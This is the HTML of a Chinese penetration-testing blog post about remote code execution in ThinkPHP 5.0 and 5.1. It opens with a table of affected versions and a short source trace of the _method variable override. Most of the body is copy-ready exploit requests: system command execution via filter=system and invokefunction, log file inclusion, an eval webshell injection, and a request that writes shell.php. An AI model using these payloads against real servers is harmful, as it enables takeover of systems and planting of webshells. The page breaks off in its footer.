@@ -1,0 +1,939 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="ThinkPHP 框架RCE漏洞 首先我们要了解 Thinkphp MVC 开发模式执行流程：  发起请求-&amp;gt;开始路由检测-&amp;gt;获取pathinfo信息-&amp;gt;路由匹配-&amp;gt;开始路由解析-&amp;gt;获得模块、控制器、操作方法调度信息-&amp;gt;开始路由调度-&amp;gt;解析模块和类名-&amp;gt;组建命名空间&amp;gt;查找并加载类-&amp;gt;实例化控制器并调用操作方法-&amp;gt;构建响应对象-&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TP框架RCE">
+<meta property="og:url" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;27&#x2F;TP%E6%A1%86%E6%9E%B6RCE&#x2F;index.html">
+<meta property="og:site_name" content="白仁的博客">
+<meta property="og:description" content="ThinkPHP 框架RCE漏洞 首先我们要了解 Thinkphp MVC 开发模式执行流程：  发起请求-&amp;gt;开始路由检测-&amp;gt;获取pathinfo信息-&amp;gt;路由匹配-&amp;gt;开始路由解析-&amp;gt;获得模块、控制器、操作方法调度信息-&amp;gt;开始路由调度-&amp;gt;解析模块和类名-&amp;gt;组建命名空间&amp;gt;查找并加载类-&amp;gt;实例化控制器并调用操作方法-&amp;gt;构建响应对象-&amp;gt">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;27&#x2F;TP%E6%A1%86%E6%9E%B6RCE&#x2F;run%E6%96%B9%E6%B3%95.png">
+<meta property="og:updated_time" content="2019-11-29T02:54:29.217Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;bai-ren-1.github.io&#x2F;2019&#x2F;11&#x2F;27&#x2F;TP%E6%A1%86%E6%9E%B6RCE&#x2F;run%E6%96%B9%E6%B3%95.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://bai-ren-1.github.io/2019/11/27/TP框架RCE/"/>
+
+
+
+
+
+  <title>TP框架RCE | 白仁的博客</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">白仁的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2019/11/27/TP%E6%A1%86%E6%9E%B6RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="白仁">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="白仁的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">TP框架RCE</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-27T20:16:21+08:00">
+                2019-11-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="ThinkPHP-框架RCE漏洞"><a href="#ThinkPHP-框架RCE漏洞" class="headerlink" title="ThinkPHP 框架RCE漏洞"></a>ThinkPHP 框架RCE漏洞</h1><p> 首先我们要了解 Thinkphp MVC 开发模式执行流程：</p>
+<blockquote>
+<p>发起请求-&gt;开始路由检测-&gt;获取pathinfo信息-&gt;路由匹配-&gt;开始路由解析-&gt;获得模块、控制器、操作方法调度信息-&gt;开始路由调度-&gt;解析模块和类名-&gt;组建命名空间&gt;查找并加载类-&gt;实例化控制器并调用操作方法-&gt;构建响应对象-&gt;响应输出-&gt;日志保存-&gt;程序运行结束</p>
+</blockquote>
+<p>漏洞原因：路由控制不严谨，默认不开启强制路由，从而可以任意调用Thinkphp的类库</p>
+<p> 实现RCE主要有俩种方法：</p>
+<ul>
+<li>变量覆盖导致RCE </li>
+<li>路由控制不严谨导致的RCE</li>
+</ul>
+<h2 id="变量覆盖导致RCE"><a href="#变量覆盖导致RCE" class="headerlink" title="变量覆盖导致RCE"></a>变量覆盖导致RCE</h2><p>通过Request中的变量覆盖进行RCE攻击的影响版本以及攻击条件如下表所示：</p>
+<table>
+<thead>
+<tr>
+<th align="center">版本名</th>
+<th align="center">是否可被攻击</th>
+<th align="center">攻击条件</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">5.0.0</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.1</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.2</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.3</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.4</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.5</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.6</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.7</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.8</td>
+<td align="center">是</td>
+<td align="center">无需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.9</td>
+<td align="center">是</td>
+<td align="center">无需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.10</td>
+<td align="center">是</td>
+<td align="center">无需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.11</td>
+<td align="center">是</td>
+<td align="center">无需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.12</td>
+<td align="center">是</td>
+<td align="center">无需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.13</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.14</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.15</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.16</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.17</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.18</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.19</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.20</td>
+<td align="center">否</td>
+<td align="center">无</td>
+</tr>
+<tr>
+<td align="center">5.0.21</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.22</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+<tr>
+<td align="center">5.0.23</td>
+<td align="center">是</td>
+<td align="center">需开启debug</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p>5.0.0</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /thinkphp5.0.0 HTTP/1.1 </span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter=system&amp;a=whoami&amp;method=GET</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<p>5.0.0 溯源分析：</p>
+<p>入口文件public/index.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 定义应用目录 </span></span><br><span class="line">define(<span class="string">'APP_PATH'</span>, <span class="keyword">__DIR__</span> . <span class="string">'/../application/'</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载框架引导文件 </span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/../thinkphp/start.php'</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">//第一句定义了APP_PATH（应用）的目录为application；</span></span><br><span class="line"><span class="comment">//第二句加载了thinkphp下面的start.php；</span></span><br></pre></td></tr></table></figure>
+
+<p>我们跟进包含进来的start.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 加载基础文件 </span></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/base.php'</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 执行应用 </span></span><br><span class="line">App::run()-&gt;send(); </span><br><span class="line"></span><br><span class="line"><span class="comment">//第一句加载当前目录下面的base.php</span></span><br><span class="line"><span class="comment">//第二句执行App类下面的run方法，然后run方法返回的对象执行send方法</span></span><br></pre></td></tr></table></figure>
+
+<p>这里注释一下 :: 和 -&gt; 的不同，预防忘记：</p>
+<blockquote>
+<p>::    该运算符是调用一个类中的静态成员的方法 (只能是static定义)</p>
+<p>-&gt;   该操作符是操作一个类中的成员变量的方法（可以是非static定义）</p>
+</blockquote>
+<p>跟进thinkphp/library/think/App.php下面的App类：</p>
+<blockquote>
+<p>sublime放在start.php里面App::run()-&gt;send()的App上就会自动超链接跟进该类所在的文件</p>
+</blockquote>
+<p>可以看到如果没有调度信息 dispatch 就会调用 routeCheck方法检测路由，并返回变量 dispatch：</p>
+<p><img src="/2019/11/27/TP%E6%A1%86%E6%9E%B6RCE/run%E6%96%B9%E6%B3%95.png" alt></p>
+<p>我们跟进里面的routeCheck方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span><span class="params">($request, array $config)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">    $result = Route::check($request, $path, $depr, $config[<span class="string">'url_domain_deploy'</span>]);</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>routeCheck的关键在于  Route 类里面的方法 check 我们继续跟进</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($request, $url, $depr = <span class="string">'/'</span>, $checkDomain = false)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ...</span><br><span class="line">        $method = $request-&gt;method();</span><br><span class="line">        <span class="comment">// 获取当前请求类型的路由规则</span></span><br><span class="line">        $rules = <span class="keyword">self</span>::$rules[$method];</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>Route 里面的 check 方法先调用 request 对象里面的 method 方法，获取请求的方式并把结果返回给 method ：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">method</span><span class="params">($method = false)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">true</span> === $method) &#123;</span><br><span class="line">    <span class="comment">// 获取原始请求类型</span></span><br><span class="line">    <span class="keyword">return</span> IS_CLI ? <span class="string">'GET'</span> : (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>]) ? <span class="keyword">$this</span>-&gt;server[<span class="string">'REQUEST_METHOD'</span>] : $_SERVER[<span class="string">'REQUEST_METHOD'</span>]);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (!<span class="keyword">$this</span>-&gt;method) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[Config::get(<span class="string">'var_method'</span>)])) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;method = 	</span><br><span class="line">      strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>method 方法中 method 的值初始化为 false 所以进入 elseif 分支，其中 application/config 下面的 var_method 为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line"><span class="string">'var_method'</span>   =&gt; <span class="string">'_method'</span>,</span><br></pre></td></tr></table></figure>
+
+<p>那么我们就可以 POST 传入一个 _method 进入 if 分支，进入这段代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;method = strtoupper($_POST[Config::get(<span class="string">'var_method'</span>)]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;method&#125;($_POST);</span><br></pre></td></tr></table></figure>
+
+<p>控制 ‘var_method’ -&gt; 控制 ‘$this-&gt;method’ -&gt; 控制’$this-&gt;{$this-&gt;method}($_POST)’  ，导致我们可以控制该类下面的任意方法：</p>
+<p>PAYLOAD里面提交的 _method 值是 __construct </p>
+<ul>
+<li>5.0.8-5.0.19</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：http://localhost/public/  #具体网站的路由具体判断</span><br><span class="line">PAYLOAD：s=whoami&amp;_method=__construct&amp;filter[]=system</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>5.0.20-5.0.23</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：http://localhost/public/  #具体网站的路由具体判断</span><br><span class="line">PAYLOAD：_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>利用文件包含</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：http://localhost/public/  #具体网站的路由具体判断</span><br><span class="line">PAYLOAD：_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../data/runtime/log/201901/21.log&amp;x=phpinfo();</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>利用其他变量传参</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL：http://localhost/public/  #具体网站的路由具体判断</span><br><span class="line">PAYLOAD：_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&apos;x&apos;])?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-路由控制不严谨导致的RCE"><a href="#2-路由控制不严谨导致的RCE" class="headerlink" title="2.路由控制不严谨导致的RCE"></a>2.路由控制不严谨导致的RCE</h2><ul>
+<li><p>TP版本5.0.21（使用\think\app下的invokefunction）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//执行系统命令</span><br><span class="line">http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">//执行phpinfo</span><br><span class="line">http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>TP版本5.0.22（使用\think\app下的invokefunction）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//执行系统命令</span><br><span class="line">http://localhost/thinkphp_5.0.22/?</span><br><span class="line">s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line"></span><br><span class="line">//执行phpinfo</span><br><span class="line">http://localhos/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li><p>TP5.1.* （thinkphp5.1.29为例）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">一、使用\think\Request的input：</span><br><span class="line">代码执行:</span><br><span class="line">http://url/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line"></span><br><span class="line">命令执行:</span><br><span class="line">http://url/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=操作系统命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">二、使用\think\template\driver\file的write：</span><br><span class="line">文件写入（写shell）：</span><br><span class="line">http://url/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">三、使用\think\view\driver\Php的display</span><br><span class="line">phpinfo执行：</span><br><span class="line">http://url/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">四、使用\think\app下的invokefunction  </span><br><span class="line">代码执行:</span><br><span class="line">http://url/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">命令执行:</span><br><span class="line">http://url/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">五、使用\think\Container下的invokefunction  </span><br><span class="line">代码执行:</span><br><span class="line">http://url/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line"></span><br><span class="line">命令执行:  </span><br><span class="line">http://url/?</span><br><span class="line">s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><ul>
+<li><a href="https://bbs.ichunqiu.com/thread-49591-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-49591-1-1.html</a> </li>
+<li><a href="https://blog.csdn.net/qq_36304918/article/details/86384042" target="_blank" rel="noopener">https://blog.csdn.net/qq_36304918/article/details/86384042</a> </li>
+<li><a href="https://blog.csdn.net/weixin_40709439/article/details/86564457" target="_blank" rel="noopener">https://blog.csdn.net/weixin_40709439/article/details/86564457</a> </li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/11/21/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%B9%8BreGeorg/" rel="next" title="内网渗透工具之reGeorg">
+                <i class="fa fa-chevron-left"></i> 内网渗透工具之reGeorg
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/11/30/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8DAY1/" rel="prev" title="二进制安全DAY1">
+                二进制安全DAY1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">白仁</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ThinkPHP-框架RCE漏洞"><span class="nav-number">1.</span> <span class="nav-text">ThinkPHP 框架RCE漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#变量覆盖导致RCE"><span class="nav-number">1.1.</span> <span class="nav-text">变量覆盖导致RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-路由控制不严谨导致的RCE"><span class="nav-number">1.2.</span> <span class="nav-text">2.路由控制不严谨导致的RCE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考连接"><span class="nav-number">1.3.</span> <span class="nav-text">参考连接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
